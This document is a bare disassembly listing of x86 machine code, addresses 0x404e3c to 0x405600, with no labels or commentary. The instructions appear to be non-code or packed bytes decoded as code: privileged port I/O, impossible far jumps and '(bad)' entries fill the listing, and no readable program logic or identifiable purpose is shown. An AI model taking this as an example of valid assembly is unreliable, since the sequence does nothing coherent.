  404e3c:	sub    ebx,DWORD PTR [edx+0x39b198c7]
  404e42:	mov    dh,0x5e
  404e44:	add    cl,al
  404e46:	mov    ah,0xa1
  404e48:	push   es
  404e49:	push   esi
  404e4a:	pop    esp
  404e4b:	aad    0x4b
  404e4d:	inc    ebx
  404e4e:	int3   
  404e4f:	add    al,0x4d
  404e51:	ret    0x1d0c
  404e54:	mov    dl,0xef
  404e56:	xor    al,0x1e
  404e58:	rcl    DWORD PTR [ebx-0x2e50ca7a],cl
  404e5e:	rol    esp,cl
  404e60:	aam    0x31
  404e62:	adc    BYTE PTR [edi],0x2a
  404e65:	xor    al,0xdc
  404e67:	dec    ebp
  404e68:	push   es
  404e69:	imul   edi,ebx,0xd09f9c60
  404e6f:	dec    esi
  404e70:	sbb    eax,0x60d25065
  404e75:	es xchg ebx,eax
  404e77:	add    eax,0x867f83c2
  404e7c:	inc    ecx
  404e7d:	ds mov edi,0x168fbbe7
  404e83:	test   BYTE PTR [ebp+0x3cac995a],bl
  404e89:	sub    al,0x0
  404e8b:	push   es
  404e8c:	adc    BYTE PTR [eax],0x93
  404e8f:	jbe    0x404eaa
  404e91:	aad    0xc1
  404e93:	daa    
  404e94:	inc    edi
  404e95:	pop    ebx
  404e96:	enter  0xfc3e,0xdc
  404e9a:	push   0x29d96537
  404e9f:	dec    edi
  404ea0:	dec    edi
  404ea1:	xor    eax,esi
  404ea3:	js     0x404ec6
  404ea5:	jmp    0x832211be
  404eaa:	pop    es
  404eab:	out    0x24,al
  404ead:	aam    0x85
  404eaf:	arpl   WORD PTR [edi+ecx*1],si
  404eb2:	cmc    
  404eb3:	sbb    esi,DWORD PTR [esi]
  404eb5:	add    DWORD PTR [ecx+0x59a8b1d4],ebx
  404ebb:	mov    al,0x21
  404ebd:	sbb    esi,DWORD PTR [eax-0x52]
  404ec0:	mov    eax,0x5d724280
  404ec5:	sub    sp,ax
  404ec8:	sub    BYTE PTR [ecx],bl
  404eca:	aad    0x58
  404ecc:	push   0xf4d19e4f
  404ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ed2:	add    DWORD PTR [esi-0x6d],0x5
  404ed6:	mov    ecx,0xb9a971db
  404edb:	push   es
  404edc:	cwde   
  404edd:	es call 0x72d8:0x620181d0
  404ee5:	xor    al,0xd9
  404ee7:	repnz xchg edi,eax
  404ee9:	push   es
  404eea:	test   al,0x5b
  404eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eed:	lods   eax,DWORD PTR ds:[esi]
  404eee:	dec    eax
  404eef:	xor    dl,ah
  404ef1:	into   
  404ef2:	mov    WORD PTR [ebp-0x73c30277],?
  404ef8:	test   eax,0x2c02d912
  404efd:	xor    DWORD PTR [esi],ebp
  404eff:	xchg   BYTE PTR [esp+ecx*4+0x3],dh
  404f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f04:	ss popa 
  404f06:	pop    esp
  404f07:	add    BYTE PTR [eax-0x1f],dl
  404f0a:	jnp    0x404eee
  404f0c:	enter  0xbb6,0x88
  404f10:	and    esp,ebp
  404f12:	xor    BYTE PTR [eax+0x56fa9be9],bl
  404f18:	jno    0x404f4f
  404f1a:	adc    al,0x59
  404f1c:	out    dx,eax
  404f1d:	lock push 0x2ab9a5bc
  404f23:	jecxz  0x404f6a
  404f25:	dec    edi
  404f26:	ret    
  404f27:	mov    BYTE PTR [edi-0x22],dl
  404f2a:	mov    bl,0xf
  404f2c:	sbb    edx,DWORD PTR ds:0x596ceb20
  404f32:	jne    0x404f31
  404f34:	adc    eax,0xa278a3f5
  404f39:	jae    0x404ef2
  404f3b:	jbe    0x404f25
  404f3d:	imul   esp,esp,0x24
  404f40:	push   es
  404f41:	push   cs
  404f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f43:	sbb    dl,bh
  404f45:	inc    edi
  404f46:	sub    BYTE PTR [eax],bl
  404f48:	adc    DWORD PTR [edx-0x5270d36c],edi
  404f4e:	stos   DWORD PTR es:[edi],eax
  404f4f:	call   0xbcb2f52b
  404f54:	sbb    cl,BYTE PTR [esi+0x72]
  404f57:	mov    ebp,0xd598efd2
  404f5c:	sbb    edx,edi
  404f5e:	inc    edx
  404f5f:	inc    ecx
  404f60:	fs imul edi,esi,0x7b1b2418
  404f67:	ds sub dl,dl
  404f6a:	loop   0x404f28
  404f6c:	xor    BYTE PTR [ebx-0x7599473c],ch
  404f72:	out    dx,al
  404f73:	add    BYTE PTR [esi-0x78],0x35
  404f77:	aad    0x19
  404f79:	in     al,0x18
  404f7b:	cmp    al,0xb2
  404f7d:	pop    ds
  404f7e:	mov    edi,0xe3b0b8a0
  404f83:	cmp    al,0x8b
  404f85:	dec    esi
  404f86:	sti    
  404f87:	rcr    BYTE PTR [eax+0x569115bc],0xaa
  404f8e:	and    al,0x5d
  404f90:	inc    edx
  404f91:	fnstcw WORD PTR [ebp-0x3ce8a128]
  404f97:	pop    ebx
  404f98:	scas   al,BYTE PTR es:[edi]
  404f99:	or     bh,bh
  404f9b:	imul   edx,ebp,0x4
  404f9e:	push   cs
  404f9f:	dec    esi
  404fa0:	in     eax,dx
  404fa1:	popa   
  404fa2:	std    
  404fa3:	rcr    BYTE PTR [ecx+edx*1-0x45],0x34
  404fa8:	fdiv   st,st(1)
  404faa:	sub    al,0x24
  404fac:	mov    ah,0x63
  404fae:	push   ss
  404faf:	je     0x404fb8
  404fb1:	ins    DWORD PTR es:[edi],dx
  404fb2:	test   al,0x39
  404fb4:	inc    edi
  404fb5:	fldenv [edi+ebp*4+0x5fa2605a]
  404fbc:	lods   eax,DWORD PTR ds:[esi]
  404fbd:	pop    ecx
  404fbe:	mov    cl,0x25
  404fc0:	fwait
  404fc1:	aaa    
  404fc2:	pop    es
  404fc3:	pop    edi
  404fc4:	or     DWORD PTR [eax-0x46457ce6],ecx
  404fca:	test   al,0x12
  404fcc:	je     0x404fa0
  404fce:	xchg   DWORD PTR [eax+ecx*2+0x17bab8c7],esp
  404fd5:	mov    bh,0x39
  404fd7:	cmp    BYTE PTR [edx],ch
  404fd9:	cdq    
  404fda:	iret   
  404fdb:	push   cs
  404fdc:	mov    BYTE PTR ds:0x6be052fc,al
  404fe2:	pop    eax
  404fe3:	jae    0x404faa
  404fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe6:	ins    BYTE PTR es:[edi],dx
  404fe7:	call   0x27a:0xeefe1902
  404fee:	mov    ebx,0x4ca4f2d8
  404ff3:	shl    DWORD PTR [edi-0x5f],0x12
  404ff7:	popf   
  404ff8:	fnstsw WORD PTR [esi+0x33ed9cea]
  404ffe:	or     edi,eax
  405000:	nop
  405001:	add    DWORD PTR [ebx+0x25],ebx
  405004:	aaa    
  405005:	jo     0x404f9a
  405007:	dec    ebx
  405008:	sbb    DWORD PTR [eax-0x4c],esi
  40500b:	and    BYTE PTR [ebp+edx*2+0x1a973c1b],bl
  405012:	setle  BYTE PTR [ecx-0x3715d354]
  405019:	(bad)  
  40501a:	adc    BYTE PTR [esi],ch
  40501c:	jnp    0x404fef
  40501e:	sub    BYTE PTR [ebp-0x6e],ah
  405021:	xchg   ebx,ebx
  405023:	(bad)  
  405024:	cmp    BYTE PTR [ebx-0xe734885],bl
  40502a:	sahf   
  40502b:	test   eax,0xba6fbd97
  405030:	jnp    0x405082
  405032:	pushf  
  405033:	retf   0x8324
  405036:	mov    eax,esp
  405038:	test   al,0x8a
  40503a:	test   esi,ebx
  40503c:	vcvtpd2ps xmm6,XMMWORD PTR [edi+0x24]
  405041:	xchg   esi,eax
  405042:	xor    ebp,0x37c4dfbc
  405048:	and    al,0xef
  40504a:	push   ds
  40504b:	scas   eax,DWORD PTR es:[edi]
  40504c:	call   0x34ad:0xcad513e5
  405053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405054:	xchg   ebp,eax
  405055:	xchg   edx,eax
  405056:	ss push ebx
  405058:	pusha  
  405059:	fstp   TBYTE PTR [edi+0x68]
  40505c:	or     eax,0x144c86dd
  405061:	(bad)  
  405063:	inc    ecx
  405064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405065:	shl    BYTE PTR [esi-0xe78d67c],cl
  40506b:	ins    DWORD PTR es:[edi],dx
  40506c:	xor    eax,0xf3287535
  405071:	pop    edx
  405072:	in     eax,0x82
  405074:	push   ebp
  405075:	or     eax,0x51db3181
  40507a:	scas   al,BYTE PTR es:[edi]
  40507b:	(bad)  
  40507c:	out    0x3d,eax
  40507e:	cmc    
  40507f:	adc    eax,0xf11eaa55
  405084:	test   DWORD PTR [ebx+ebx*2+0x4a],ebx
  405088:	aaa    
  405089:	(bad)  
  40508b:	ficom  WORD PTR [ebp+0x49c113de]
  405091:	loope  0x40501a
  405093:	fdiv   st(3),st
  405095:	fnstcw WORD PTR [edx]
  405097:	daa    
  405098:	jmp    0xdb55:0xb8fad405
  40509f:	push   ecx
  4050a0:	cmp    DWORD PTR [edx],esi
  4050a2:	js     0x405049
  4050a4:	mov    ch,0xc2
  4050a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050a7:	xlat   BYTE PTR ds:[ebx]
  4050a8:	mov    WORD PTR [ecx+edx*1+0x12377c6c],?
  4050af:	sub    ebp,edi
  4050b1:	leave  
  4050b2:	imul   esp,DWORD PTR [edi-0x24],0x1a
  4050b6:	push   0x76ef6d98
  4050bb:	inc    edx
  4050bc:	test   BYTE PTR [edi+ebp*1+0x29163345],0xa9
  4050c4:	mov    ah,0x18
  4050c6:	add    edi,DWORD PTR [edx]
  4050c8:	outs   dx,BYTE PTR ds:[esi]
  4050c9:	push   ebx
  4050ca:	in     eax,dx
  4050cb:	enter  0xbd55,0x90
  4050cf:	sbb    edi,DWORD PTR [edx+0x6e2e6308]
  4050d5:	add    bh,ch
  4050d7:	in     eax,dx
  4050d8:	cmc    
  4050d9:	mov    bh,0x92
  4050db:	call   0x502ff988
  4050e0:	push   ebp
  4050e1:	push   esi
  4050e2:	xchg   esi,eax
  4050e3:	inc    esp
  4050e4:	jmp    0xa22a:0x7f454587
  4050eb:	xor    edx,eax
  4050ed:	jmp    0x40512e
  4050ef:	add    edi,DWORD PTR [esi]
  4050f1:	imul   eax,DWORD PTR [edi+0x9f6042e],0xe31cef9f
  4050fb:	dec    ebx
  4050fc:	mov    ah,0xc3
  4050fe:	sub    al,0x71
  405100:	sub    esp,DWORD PTR [esi]
  405102:	adc    dl,BYTE PTR [eax]
  405104:	cmc    
  405105:	test   BYTE PTR [ecx],bl
  405107:	dec    edx
  405108:	mov    eax,0xb71e7507
  40510d:	lahf   
  40510e:	xchg   esp,eax
  40510f:	lods   al,BYTE PTR ds:[esi]
  405110:	mov    ah,0x59
  405112:	pop    esp
  405113:	xchg   ebx,eax
  405114:	out    dx,eax
  405115:	sbb    dl,BYTE PTR [edx+0x3bff22d5]
  40511b:	jecxz  0x405182
  40511d:	and    BYTE PTR [eax],cl
  40511f:	(bad)  
  405120:	js     0x405188
  405122:	mov    ds:0x7aa91b00,al
  405127:	mov    dh,0x4a
  405129:	push   ebp
  40512a:	fild   QWORD PTR [edi]
  40512c:	pop    edx
  40512d:	and    eax,0xa91b9165
  405132:	sbb    eax,0x6e4e192
  405137:	lds    ebp,FWORD PTR [edi]
  405139:	inc    ecx
  40513a:	push   edi
  40513b:	je     0x40510f
  40513d:	lods   al,BYTE PTR ds:[esi]
  40513e:	retf   0xc713
  405141:	lds    esp,FWORD PTR [eax+0x11]
  405144:	out    dx,al
  405145:	jae    0x40516e
  405147:	ss mov ebp,ecx
  40514a:	add    BYTE PTR [ebp+0xe],al
  40514d:	icebp  
  40514e:	daa    
  40514f:	dec    esi
  405150:	rcr    BYTE PTR [edx+0x2b3afa9b],0xd8
  405157:	or     edi,esp
  405159:	(bad)
  40515e:	inc    eax
  40515f:	stc    
  405160:	shl    BYTE PTR [edi*1+0x2acbb0be],1
  405167:	mov    ch,0x4e
  405169:	push   eax
  40516a:	std    
  40516b:	loop   0x40519e
  40516d:	inc    ecx
  40516e:	inc    ebx
  40516f:	mov    ch,0x31
  405171:	pushf  
  405172:	adc    eax,0xe29985a
  405177:	jbe    0x4051dc
  405179:	xchg   edi,eax
  40517a:	jae    0x405102
  40517c:	adc    eax,0xf37a2ce6
  405181:	dec    ecx
  405182:	mov    al,0xce
  405184:	adc    al,0x1
  405186:	div    edi
  405188:	out    0x13,al
  40518a:	jnp    0x4051e8
  40518c:	(bad)  
  40518d:	xchg   ax,bp
  405190:	loopne 0x4051da
  405192:	stos   DWORD PTR es:[edi],eax
  405193:	fidiv  DWORD PTR [eax-0x38]
  405196:	jge    0x405163
  405198:	sbb    edi,DWORD PTR [edi]
  40519a:	es dec ecx
  40519c:	jno    0x405215
  40519e:	aas    
  40519f:	mov    dh,bh
  4051a1:	ffree  st(3)
  4051a3:	cmp    al,0x99
  4051a5:	dec    ecx
  4051a6:	cdq    
  4051a7:	sub    edx,DWORD PTR [ebx+0x3b]
  4051aa:	(bad)  
  4051ab:	loope  0x40518a
  4051ad:	inc    ebx
  4051ae:	add    eax,DWORD PTR [ecx+0x1]
  4051b1:	sahf   
  4051b2:	test   DWORD PTR [ebx-0x7d],edi
  4051b5:	ja     0x4051d9
  4051b7:	fnsave [esi]
  4051b9:	addr16 (bad) 
  4051bb:	push   esp
  4051bc:	mov    ch,0x13
  4051be:	mov    cl,0x28
  4051c0:	xor    DWORD PTR [ebx-0x614966c4],ecx
  4051c6:	clc    
  4051c7:	cmp    DWORD PTR [edx],edx
  4051c9:	sbb    BYTE PTR [edi],dh
  4051cb:	out    dx,al
  4051cc:	fisub  DWORD PTR [eax]
  4051ce:	mov    bh,0x54
  4051d0:	sbb    DWORD PTR [edx+0x7e],edi
  4051d3:	fldenv [edi-0x2f790b5b]
  4051d9:	mov    edx,0x179ed8ff
  4051de:	rol    esp,1
  4051e0:	dec    esi
  4051e1:	pop    edi
  4051e2:	std    
  4051e3:	pop    ecx
  4051e4:	jnp    0x4051ed
  4051e6:	and    DWORD PTR [ebx-0x32],esi
  4051e9:	test   eax,0x16454293
  4051ee:	neg    eax
  4051f0:	lods   al,BYTE PTR ds:[esi]
  4051f1:	sub    ah,BYTE PTR [eax-0x6e]
  4051f4:	cdq    
  4051f5:	sbb    cl,BYTE PTR [eax-0x29721f00]
  4051fb:	mov    cl,0x40
  4051fd:	out    dx,eax
  4051fe:	pop    ebx
  4051ff:	into   
  405200:	sub    eax,0xc7e58309
  405205:	mov    dl,0xc4
  405207:	sub    al,0x14
  405209:	adc    eax,0x27b58dd
  40520e:	push   0x8d621136
  405213:	pop    edi
  405214:	cwde   
  405215:	jge    0x405218
  405217:	inc    ebp
  405218:	adc    DWORD PTR [edi-0x5e],esi
  40521b:	pop    ebp
  40521c:	jb     0x405206
  40521e:	call   0x868372e3
  405223:	ins    BYTE PTR es:[edi],dx
  405224:	and    ch,BYTE PTR [eax+0x21528a7e]
  40522a:	push   0xffffffc5
  40522c:	adc    DWORD PTR [ecx+0x5368b370],ebx
  405232:	test   BYTE PTR [eax],ah
  405234:	imul   ecx,DWORD PTR es:[ecx-0x6072cd81],0x23
  40523c:	pusha  
  40523d:	lds    ebp,FWORD PTR [ebp+0x63]
  405240:	jmp    0x40527d
  405242:	adc    ebp,ebp
  405244:	out    dx,eax
  405245:	scas   al,BYTE PTR es:[edi]
  405246:	out    dx,eax
  405247:	push   eax
  405248:	push   edi
  405249:	ret    
  40524a:	shl    BYTE PTR [eax],0x0
  40524d:	or     cl,bh
  40524f:	pop    esp
  405250:	xor    DWORD PTR [edi-0x3b3bc6fe],edx
  405256:	mov    ds:0x7d373423,eax
  40525b:	mov    ch,0xa3
  40525d:	aas    
  40525e:	rcl    DWORD PTR [ebx+edi*4-0x23fff074],1
  405265:	imul   eax,DWORD PTR [ebx+0x43],0x3a
  405269:	es lock mov ebx,0x4bf4111d
  405270:	push   eax
  405271:	fwait
  405272:	jmp    FWORD PTR [esp+eiz*8+0x6f3c4c40]
  405279:	adc    eax,0x59b0b037
  40527e:	adc    esp,DWORD PTR [edi+0x7a]
  405281:	inc    esp
  405282:	sbb    eax,0x69e580cd
  405287:	and    al,BYTE PTR [ecx]
  405289:	mov    ebx,0x13987513
  40528e:	xor    dl,BYTE PTR [ebp+0x30]
  405291:	pop    esp
  405292:	mov    ?,WORD PTR [ebx-0x46da4c69]
  405298:	cmp    DWORD PTR [ecx+0x78950949],ecx
  40529e:	into   
  40529f:	test   eax,0xddcc4b1
  4052a4:	call   0xfd49:0xbbe02c6e
  4052ab:	stos   BYTE PTR es:[edi],al
  4052ac:	inc    eax
  4052ad:	sbb    eax,0xe8de4754
  4052b2:	adc    esi,edx
  4052b4:	aaa    
  4052b5:	sbb    BYTE PTR [esi],0xcd
  4052b8:	xor    cl,cl
  4052ba:	mov    dl,0xd2
  4052bc:	loop   0x40525e
  4052be:	mov    bl,0x24
  4052c0:	xor    BYTE PTR [esi],cl
  4052c2:	scas   al,BYTE PTR es:[edi]
  4052c3:	adc    cl,bl
  4052c5:	out    dx,al
  4052c6:	push   edx
  4052c7:	mov    eax,ds:0x36cf061b
  4052cc:	test   BYTE PTR [edx-0x38d45aef],al
  4052d2:	sar    DWORD PTR [ecx],0xf6
  4052d5:	cmp    ah,BYTE PTR [ebx]
  4052d7:	loopne 0x4052e3
  4052d9:	int3   
  4052da:	pop    ecx
  4052db:	scas   al,BYTE PTR es:[edi]
  4052dc:	into   
  4052dd:	imul   esi,DWORD PTR [ebx-0x23ad6ab6],0xfffffffa
  4052e4:	dec    edi
  4052e5:	fidivr WORD PTR [edi-0x34]
  4052e8:	inc    ebx
  4052e9:	add    bl,BYTE PTR [edx+ecx*4+0x9a23cb0]
  4052f0:	mov    ch,0x25
  4052f2:	je     0x405338
  4052f4:	loope  0x4052b8
  4052f6:	mov    DWORD PTR [edi-0x34],edx
  4052f9:	fs stos BYTE PTR es:[edi],al
  4052fb:	outs   dx,BYTE PTR ds:[esi]
  4052fc:	or     al,0x3e
  4052fe:	jb     0x40535e
  405300:	xchg   edx,eax
  405301:	dec    ecx
  405302:	cli    
  405303:	pop    ecx
  405304:	adc    BYTE PTR [eax+0x5b25c0ee],bl
  40530a:	fwait
  40530b:	mov    ds:0x334694fd,eax
  405310:	xchg   ecx,eax
  405311:	ds enter 0xb7dd,0x4f
  405316:	jns    0x405382
  405318:	and    dh,BYTE PTR [ecx]
  40531a:	les    esp,FWORD PTR [edi+esi*1+0x188c02e1]
  405321:	adc    DWORD PTR [esi],ecx
  405323:	dec    edi
  405324:	inc    esi
  405325:	xor    dl,BYTE PTR [esi]
  405327:	jge    0x40533c
  405329:	inc    si
  40532b:	mov    ch,0xc4
  40532d:	call   0x32e3:0xd2418305
  405334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405335:	shl    DWORD PTR [ebp+0x2f],cl
  405338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405339:	popf   
  40533a:	sar    BYTE PTR [ebx+0x77],cl
  40533d:	dec    ecx
  40533e:	xchg   ebp,eax
  40533f:	mov    edx,0x74e99022
  405344:	mov    edx,0xc3e8245
  405349:	mov    cl,0x21
  40534b:	test   eax,0x3446404a
  405350:	stc    
  405351:	clc    
  405352:	fiadd  DWORD PTR [ebx]
  405354:	jae    0x4052db
  405356:	adc    edi,DWORD PTR [esi-0x2b0c9832]
  40535c:	sbb    eax,DWORD PTR [ebx+0x67d8901c]
  405362:	fimul  WORD PTR [edx]
  405364:	mov    dl,0x36
  405366:	xchg   ebx,eax
  405367:	das    
  405368:	jb     0x405313
  40536a:	out    dx,al
  40536b:	add    BYTE PTR [edx+edx*1+0x78],al
  40536f:	push   ecx
  405370:	mov    al,BYTE PTR [ecx]
  405372:	pop    ebx
  405373:	push   esi
  405374:	push   cs
  405375:	xrelease xchg BYTE PTR [eax],bh
  405378:	mov    cl,BYTE PTR [esi]
  40537a:	jp     0x405302
  40537c:	shl    DWORD PTR [ecx-0x3db28afe],0xb6
  405383:	jns    0x4053a8
  405385:	inc    ebp
  405386:	popf   
  405387:	lds    edi,FWORD PTR [edx-0x4bdbf1f6]
  40538d:	push   ecx
  40538e:	jmp    0x405380
  405390:	xor    al,0xca
  405392:	pusha  
  405393:	sbb    eax,0xba2708b6
  405398:	pop    si
  40539a:	dec    edx
  40539b:	fild   WORD PTR [esp+esi*2]
  40539e:	daa    
  40539f:	pushf  
  4053a0:	or     BYTE PTR [esi+0x5ab21dcd],cl
  4053a6:	adc    DWORD PTR cs:[ecx],0xffffffcc
  4053aa:	jmp    0x40536b
  4053ac:	sbb    BYTE PTR [esi+ebx*8-0x7e],bl
  4053b0:	xchg   esp,eax
  4053b1:	ret    
  4053b2:	add    DWORD PTR [esi],0x67
  4053b5:	mov    edi,0xdafd793a
  4053ba:	mov    ch,0x87
  4053bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053bd:	repz inc eax
  4053bf:	clc    
  4053c0:	dec    ebp
  4053c1:	xchg   edx,eax
  4053c2:	push   es
  4053c3:	sbb    BYTE PTR [esi],dh
  4053c5:	mov    ch,0xf6
  4053c7:	jecxz  0x4053c2
  4053c9:	add    esp,DWORD PTR [ebx+0xe]
  4053cc:	mov    ds:0x1be71277,eax
  4053d1:	loop   0x405410
  4053d3:	jnp    0x4053df
  4053d5:	xor    DWORD PTR [eax+0x74bf184b],0xa6184c29
  4053df:	fs add eax,0x6fa26ef4
  4053e5:	daa    
  4053e6:	mov    ebp,0x42865a83
  4053eb:	jg     0x405449
  4053ed:	sti    
  4053ee:	shl    DWORD PTR [edi-0x7f6e5a6f],0xd1
  4053f5:	mov    eax,ds:0xcc2e0a75
  4053fa:	test   BYTE PTR [esi+0x54],bl
  4053fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053fe:	imul   edi,DWORD PTR [eax-0x2576c063],0x19
  405405:	and    eax,0x85fba988
  40540a:	xlat   BYTE PTR ds:[ebx]
  40540b:	mov    WORD PTR [esi+0x7e],es
  40540e:	push   eax
  40540f:	clc    
  405410:	dec    edx
  405411:	adc    dl,BYTE PTR [eax+0x0]
  405414:	cmp    BYTE PTR [edx+0x698102e4],dh
  40541a:	mov    ecx,0x176aed3d
  40541f:	fcmovbe st,st(1)
  405421:	add    eax,0x52e17a76
  405426:	add    edi,ebx
  405428:	inc    edx
  405429:	add    edi,DWORD PTR [edi+0x4895c4e5]
  40542f:	gs cmp al,0xa8
  405432:	mov    edx,DWORD PTR [ebp+0x1b]
  405435:	dec    edx
  405436:	pop    edi
  405437:	ins    BYTE PTR es:[edi],dx
  405438:	leave  
  405439:	jp     0x405412
  40543b:	jp     0x405464
  40543d:	sbb    eax,0xec759b28
  405442:	pop    esp
  405443:	jmp    0x29bf40bc
  405448:	fs fs in eax,0x62
  40544c:	lods   al,BYTE PTR ds:[esi]
  40544d:	and    esi,esi
  40544f:	fnop   
  405451:	mov    WORD PTR [eax+0x70392d8d],fs
  405457:	aaa    
  405458:	xor    dh,cl
  40545a:	xchg   ecx,eax
  40545b:	sti    
  40545c:	lahf   
  40545d:	dec    esp
  40545e:	xor    eax,0xdfc4865f
  405463:	or     DWORD PTR [esi],0x91cd902b
  405469:	lahf   
  40546a:	rcr    ecx,1
  40546c:	add    dl,dh
  40546e:	add    bl,BYTE PTR [ecx-0x4f458451]
  405474:	ret    
  405475:	adc    DWORD PTR ss:[edx-0x2510828e],edi
  40547c:	fldcw  WORD PTR [edx]
  40547e:	xor    al,0x3e
  405480:	jo     0x40540b
  405482:	call   0xfe934143
  405487:	hlt    
  405488:	fsub   DWORD PTR [bp+di-0x49]
  40548c:	out    0xef,eax
  40548e:	out    dx,al
  40548f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405490:	pop    ds
  405491:	sbb    al,0x39
  405493:	dec    ebx
  405494:	popa   
  405495:	xor    esp,DWORD PTR [ebp-0x2661fd81]
  40549b:	outs   dx,BYTE PTR ds:[esi]
  40549c:	les    edi,FWORD PTR [ebx+ebx*8]
  40549f:	stos   BYTE PTR es:[edi],al
  4054a0:	shl    BYTE PTR [ebx+0x54],1
  4054a3:	mov    esp,0x24ed4de0
  4054a8:	lea    edx,[ecx+0x72]
  4054ab:	sti    
  4054ac:	pusha  
  4054ad:	idiv   DWORD PTR [esi]
  4054af:	push   ds
  4054b0:	mov    edi,0x13f6a4ae
  4054b5:	lds    esi,FWORD PTR [esp+esi*8+0x74]
  4054b9:	das    
  4054ba:	std    
  4054bb:	sub    al,0x8e
  4054bd:	jne    0x405467
  4054bf:	inc    ecx
  4054c0:	pop    ds
  4054c1:	push   ecx
  4054c2:	arpl   WORD PTR [eax+ebp*1+0x32],sp
  4054c6:	popf   
  4054c7:	cwde   
  4054c8:	(bad)  
  4054c9:	hlt    
  4054ca:	out    0x82,al
  4054cc:	xchg   edx,eax
  4054cd:	aad    0x7e
  4054cf:	pop    ebx
  4054d0:	dec    edx
  4054d1:	(bad)  
  4054d2:	jle    0x4054ee
  4054d4:	sbb    al,0xb
  4054d6:	je     0x405472
  4054d8:	scas   eax,DWORD PTR es:[edi]
  4054d9:	arpl   cx,sp
  4054db:	and    dh,ah
  4054dd:	cmp    BYTE PTR [esi+eiz*4],dh
  4054e0:	je     0x405517
  4054e2:	icebp  
  4054e3:	sbb    esp,ebp
  4054e5:	cli    
  4054e6:	out    0xa2,eax
  4054e8:	mov    dl,0xd6
  4054ea:	push   cs
  4054eb:	mov    BYTE PTR [esi+0x1a2fbba9],0xff
  4054f2:	inc    esi
  4054f3:	loopne 0x4054d6
  4054f5:	add    esi,DWORD PTR [edx-0x11]
  4054f8:	push   edx
  4054f9:	push   ebx
  4054fa:	inc    ecx
  4054fb:	xchg   DWORD PTR [edx],esi
  4054fd:	(bad)  
  4054fe:	out    dx,al
  4054ff:	fwait
  405500:	xchg   ebx,eax
  405501:	aam    0x62
  405503:	(bad)  
  405504:	(bad)  
  405505:	outs   dx,BYTE PTR ds:[esi]
  405506:	pop    edi
  405507:	adc    DWORD PTR [edx+esi*8-0x63],esp
  40550b:	outs   dx,DWORD PTR ds:[esi]
  40550c:	and    ch,BYTE PTR [esi-0x12af4a54]
  405512:	scas   al,BYTE PTR es:[edi]
  405513:	xchg   esi,eax
  405514:	xchg   edi,eax
  405515:	rcr    ecx,1
  405517:	push   0x366d7c3d
  40551c:	imul   edi,ecx,0x75
  40551f:	jnp    0x40556f
  405521:	xchg   edi,eax
  405522:	mov    bl,0x23
  405524:	popa   
  405525:	and    BYTE PTR [edi+0x1d203b89],0xba
  40552c:	repnz test al,al
  40552f:	pusha  
  405530:	mov    bh,0x96
  405532:	jae    0x4054bb
  405534:	retf   0x1d9f
  405537:	addr16 out dx,eax
  405539:	hlt    
  40553a:	outs   dx,BYTE PTR ds:[esi]
  40553b:	out    0x97,eax
  40553d:	mov    esi,0x76bc886b
  405542:	and    DWORD PTR [ebx],eax
  405544:	sbb    edi,esp
  405546:	add    cl,al
  405548:	aaa    
  405549:	pop    edi
  40554a:	scas   eax,DWORD PTR es:[edi]
  40554b:	out    0xa8,eax
  40554d:	scas   al,BYTE PTR es:[edi]
  40554e:	push   ecx
  40554f:	push   es
  405550:	inc    ebx
  405551:	addr16 mov eax,0xc195db75
  405557:	inc    ecx
  405558:	and    ecx,ecx
  40555a:	arpl   WORD PTR [edi-0x7ea940a3],sp
  405560:	imul   ecx,DWORD PTR [edi-0x58],0xa12a6480
  405567:	or     BYTE PTR [edx+0x72],dl
  40556a:	xchg   DWORD PTR [esi+ebx*2+0x674b8e94],edx
  405571:	pop    edi
  405572:	mov    BYTE PTR [ecx+0x29713c9d],ah
  405578:	adc    cl,BYTE PTR [eax+ecx*8-0x7e]
  40557c:	mov    al,ds:0xce63437c
  405581:	mov    dh,0xbd
  405583:	rol    BYTE PTR [ecx+0xc],1
  405586:	sbb    DWORD PTR [edi+0x71a36c9d],esi
  40558c:	call   0xf93c5f65
  405591:	jl     0x4055c8
  405593:	stos   BYTE PTR es:[edi],al
  405594:	add    eax,0xf1c14651
  405599:	push   edi
  40559a:	cmp    DWORD PTR [edi+0x13],0x9710b3a1
  4055a1:	add    al,0x46
  4055a3:	push   esi
  4055a4:	xchg   ebx,eax
  4055a5:	cmp    BYTE PTR ds:0x7acf598e,bl
  4055ab:	pop    esi
  4055ac:	in     eax,dx
  4055ad:	lahf   
  4055ae:	(bad)  
  4055af:	scas   eax,DWORD PTR es:[edi]
  4055b0:	or     ch,BYTE PTR [ebp+0x6d]
  4055b3:	dec    ebx
  4055b4:	ins    DWORD PTR es:[edi],dx
  4055b5:	sar    eax,cl
  4055b7:	hlt    
  4055b8:	dec    edi
  4055b9:	mov    ecx,0xe00b802f
  4055be:	mov    esi,0xbd7062e1
  4055c3:	adc    BYTE PTR [edx-0x2b],ch
  4055c6:	int3   
  4055c7:	aam    0xa5
  4055c9:	jp     0x4055e5
  4055cb:	xor    eax,0x8524fec1
  4055d0:	into   
  4055d1:	cmc    
  4055d2:	dec    edx
  4055d3:	(bad)  
  4055d5:	xor    dl,dh
  4055d7:	int    0x47
  4055d9:	fwait
  4055da:	call   0x7bf8:0x8062fbbd
  4055e1:	mov    ds:0x4c7e73ba,eax
  4055e6:	ins    BYTE PTR es:[edi],dx
  4055e7:	cmp    ebp,esi
  4055e9:	mov    edi,0xffaaaaa
  4055ee:	xor    ecx,DWORD PTR [edx+eiz*1-0x2f]
  4055f2:	or     dl,BYTE PTR [edi-0x3962f0d5]
  4055f8:	stos   BYTE PTR es:[edi],al
  4055f9:	lods   eax,DWORD PTR ds:[esi]
  4055fa:	pop    eax
  4055fb:	(bad)  
  4055fd:	adc    BYTE PTR [esi],0x18
  405600:	inc    eax
